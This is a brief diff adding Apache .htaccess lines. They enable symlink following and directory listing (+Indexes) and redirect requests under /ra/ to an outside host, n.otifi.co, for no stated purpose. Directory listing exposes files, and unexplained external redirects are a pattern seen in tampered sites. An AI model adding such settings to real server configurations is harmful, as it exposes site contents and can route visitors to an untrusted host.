@@ -1,0 +1,4 @@
+Options +FollowSymLinks  
+Options +Indexes  
+RewriteEngine On
+RewriteRule	^/ra/(.+)$	http://n.otifi.co/ [R,L]
